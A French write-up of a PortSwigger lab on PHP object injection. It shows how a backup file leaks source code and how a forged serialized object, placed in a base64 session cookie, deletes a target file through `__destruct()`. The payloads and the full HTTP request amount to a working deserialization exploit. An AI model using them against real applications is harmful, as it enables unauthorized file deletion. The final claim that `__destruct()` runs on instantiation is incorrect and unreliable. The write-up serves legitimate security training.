# Lab

https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php

## Solution

Quand la home page charge, on voit qu'il fait référence à un fichier PHP `/libs/CustomTemplate.php`.

Etant donné que c'est du PHP, on a pas accès au code source, mais on peut essayer de le télécharger en trouvant un fichier de backup.

On peut essayer de télécharger le fichier `CustomTemplate.php~` qui est un fichier de backup créé par l'éditeur de texte `nano`.

```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

En regardant ce code on voit que la fonction magique `__destruct()` permet de supprimer le fichier de lock de l'ojet CustomTemplate.

Si on créé une chaine de caractères qui correspond à un objet CustomTemplate ayant pour `lock_file_path` la valeur `/home/carlos/morale.txt` on devrait pouvoir supprimer le fichier `morale.txt` injectant l'objet serializé à un endroit où il serait désérialisé.

`O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`

Quand on se connecte sur le site, on a un cookie session qui correspond à l'utilisateur connecté : `Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJia3FuZ3pmNnNpNGd6ZjZlNm5meW1mNGdkODFiMzEwaCI7fQ%3d%3d`

La chaine de caractères est encodée en base64, on peut la décoder : `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"bkqngzf6si4gzf6e6nfymf4gd81b310h";}`

Injectons notre objet serializé dans le cookie session : `Cookie: session=TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3d%3d`

Et on envoie la requête via la page d'accueil :

```http
GET / HTTP/2
Host: 0a7400c504a53dc384d3a0fe00660017.web-security-academy.net
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Upgrade: websocket
Origin: https://0a7400c504a53dc384d3a0fe00660017.web-security-academy.net
Sec-Websocket-Version: 13
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3d%3d
Sec-Websocket-Key: YxcKFuDLAFKYNzFTZyOwnA==
```

Ce qui valide le lab puisque la méthode `__destruct()` est une méthode magique qui est appelée automatiquement quand l'objet est instancié. 